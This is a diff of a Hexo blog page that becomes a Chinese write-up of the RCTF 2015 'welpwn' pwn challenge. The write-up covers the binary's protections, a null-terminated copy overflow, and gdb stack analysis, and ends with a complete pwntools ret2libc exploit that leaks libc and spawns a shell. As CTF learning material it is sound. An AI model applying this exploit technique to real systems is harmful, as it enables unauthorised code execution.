@@ -6,15 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2021/4 | Hexo</title>
+  <title>welpwn的题解 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2021/04/index.html">
+  <meta name="description" content="记录一道自己做的ctf题目：welpwn前言：冲冲冲！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="welpwn的题解">
+<meta property="og:url" content="http://example.com/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Awelpwn%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="记录一道自己做的ctf题目：welpwn前言：冲冲冲！">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210406213630385.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210406213724116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210406213942475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2021040621455361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210406214712301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210406215158241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210406215914764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210406221620667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2021-04-26T11:56:28.842Z">
+<meta property="article:modified_time" content="2021-04-26T12:15:56.342Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210406213630385.png">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -150,265 +163,179 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-题目：welpwn题解--攻防世界" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E6%84%9F%E6%83%B3%EF%BC%9A%E5%85%B3%E4%BA%8E%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:08:03.179Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E6%84%9F%E6%83%B3%EF%BC%9A%E5%85%B3%E4%BA%8E%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">感想：关于整数安全漏洞</a>
+    <h1 class="article-title" itemprop="name">
+      welpwn的题解
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Astack2--xctf--%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:06:45.996Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Astack2--xctf--%E9%A2%98%E8%A7%A3/">stack2--xctf的题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E6%84%9F%E6%83%B3%EF%BC%9Aelf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%EF%BC%8C%E5%9F%BA%E4%BA%8Elink%E6%97%B6/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:04:35.297Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E6%84%9F%E6%83%B3%EF%BC%9Aelf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%EF%BC%8C%E5%9F%BA%E4%BA%8Elink%E6%97%B6/">elf文件格式解析(link status)</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Aforgot%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwpmd/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:02:30.400Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Aforgot%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwpmd/">forgot题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Adice_game--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/" class="archive-article-date">
-  	<time datetime="2021-04-26T12:00:25.256Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Adice_game--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cwp/">dice_game的题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Apwn200/" class="archive-article-date">
-  	<time datetime="2021-04-26T11:59:12.801Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Apwn200/">pwn200--攻防世界的题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Awelpwn%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="archive-article-date">
+        
+        <a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Awelpwn%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" class="archive-article-date">
   	<time datetime="2021-04-26T11:56:28.842Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Awelpwn%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">welpwn的题解</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=362998&auto=0&height=66"></iframe>
 
-        <div class="article-info info-on-right">
-          
-          
+<h2 id="记录一道自己做的ctf题目：welpwn"><a href="#记录一道自己做的ctf题目：welpwn" class="headerlink" title="记录一道自己做的ctf题目：welpwn"></a>记录一道自己做的ctf题目：welpwn</h2><p>前言：冲冲冲！</p>
+<span id="more"></span>
+<p>–RCTF-2015<br>1.老生常谈checksec查看：</p>
+<p><img src="https://img-blog.csdnimg.cn/20210406213630385.png" alt="在这里插入图片描述"><br>可以看到只开了nx保护，下面我们进入ida下面看看。</p>
+<p><img src="https://img-blog.csdnimg.cn/20210406213724116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>发现是一个想rbp-400，rsp+0h的地方read进入恰好0x400的数据，然后调用了echo函数，我们进入echo看看。<br><img src="https://img-blog.csdnimg.cn/20210406213942475.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现了一个简化版的strcpy函数，第一反应溢出溢出！但是这里由于在复制过程中遇到’0x00‘会被截断，所以64位下我们打包的p64(pop_rdi)+p64(binsh_addr)+p64(system)可能复制不到一半就胎死腹中了。<br>所以我们不能直接复制，另外我们想到，如果echo函数里面发生溢出的话，很有可能回合main函数里面的buf首尾相接，我们进入gdb里面看看，随便画一幅图。<br>进入gdb的echo那里看看stack的情况<br><img src="https://img-blog.csdnimg.cn/2021040621455361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入超过24个a来覆盖掉s2。<br><img src="https://img-blog.csdnimg.cn/20210406214712301.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个时候还没有进行for循环呢，我们可以看到rsp-0x20，然后rbp的位置，以及返回地址后面紧跟着的我们输入buf里面的内容，下面我们执行循环<br><img src="https://img-blog.csdnimg.cn/20210406215158241.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到输入的字符如果足够的的话是完全可以覆盖掉，并且和rbp相接到的<br><img src="https://img-blog.csdnimg.cn/20210406215914764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里我们画出图来看看，所以重点是我们应该如何使用这里的跳转，并且在跳转之后还有我们前面补充的垃圾数据。（ps：在写到这里的时候我有了一个思路就是如何把前面的jink数据加以利用，但是感觉还是难），<br>我们可以使用四次pop指令一次pop出8个字节的数据，直接pop到我们秀的地方，而这里已经到我们的buf这里了，我们不用受到被’\x00‘截断的限制了，就是用<br><em>ret2libc，去找出偏移</em><br>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment">#我因为没有下载libcseracher所以加载的是本地libc库，各位</span></span><br><span class="line">context.log_level  = <span class="string">&#x27;debug&#x27;</span>  </span><br><span class="line">libca=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_24=<span class="number">0x40089c</span>//使用ROPgadget --binary ./welpwn --only <span class="string">&#x27;pop|ret&#x27;</span>找到的</span><br><span class="line">pop_rdi=<span class="number">0x4008a3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_got=e.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">puts=e.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">p=process(<span class="string">&quot;./welpwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(pop_24)+p64(pop_rdi)+p64(write_got)+p64(puts)+p64(<span class="number">0x400630</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x40&#x27;</span>) <span class="comment">#在0x40这里截止是因为我们受到的数据会包含s2的jink数</span></span><br><span class="line"><span class="comment">#据，而我们的0x40恰好是我们输入进去pop_rdi这里的p64打包之后倒序的最后一</span></span><br><span class="line"><span class="comment">#位，所以在这里截止</span></span><br><span class="line">write_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))<span class="comment">#读取6字节并且补充我们前导\x00记得补充要在u64解包反倒序之前  </span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;--&#x27;</span>+<span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libca.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">system_add=libc_base+libca.symbols[<span class="string">&quot;system&quot;</span>]<span class="comment">#在使用libcseracher下我们要用libca.dump，因为没有使用使用symbols</span></span><br><span class="line">binsh_addr = libc_base + libca.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">payloado=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(pop_24)+p64(pop_rdi)+p64(binsh_addr)+p64(system_add)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome to RCTF\n&quot;</span>)</span><br><span class="line">p.sendline(payloado)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>找到我们debug过程中的图来看看：<br><img src="https://img-blog.csdnimg.cn/20210406221620667.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW53ZWkyNzQ=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>另外附上一篇比我更详细的博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangaohui/p/5123992.html">https://www.cnblogs.com/wangaohui/p/5123992.html</a></p>
 
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>请给我debug<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/pay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Awelpwn%E9%A2%98%E8%A7%A3--%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/first/" class="archive-article-date">
-  	<time datetime="2021-04-26T06:38:54.129Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
+<nav id="article-nav">
+  
+    <a href="/2021/04/26/%E9%A2%98%E7%9B%AE%EF%BC%9Apwn200/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          pwn200--攻防世界的题解
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2021/04/26/first/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">my frist blog</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/first/">my frist blog</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/04/26/hello-world/" class="archive-article-date">
-  	<time datetime="2021-04-26T06:27:13.977Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-26</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/04/26/hello-world/">Hello World</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
 
 
           </div>
@@ -431,8 +358,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
